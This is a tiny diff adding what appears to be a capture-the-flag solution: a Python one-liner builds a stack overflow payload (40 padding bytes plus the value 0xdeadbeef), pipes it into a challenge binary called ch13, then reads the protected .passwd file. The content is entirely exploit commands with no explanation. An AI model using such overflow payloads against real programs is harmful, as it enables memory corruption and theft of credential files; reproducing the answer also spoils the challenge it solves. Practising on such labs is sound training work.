@@ -1,0 +1,6 @@
+python -c 'print("A"*40 + "\xef\xbe\xad\xde")' > /tmp/gbourgeo
+cat /tmp/gbourgeo | ./ch13
+cat .passwd
+
+DONE!
+
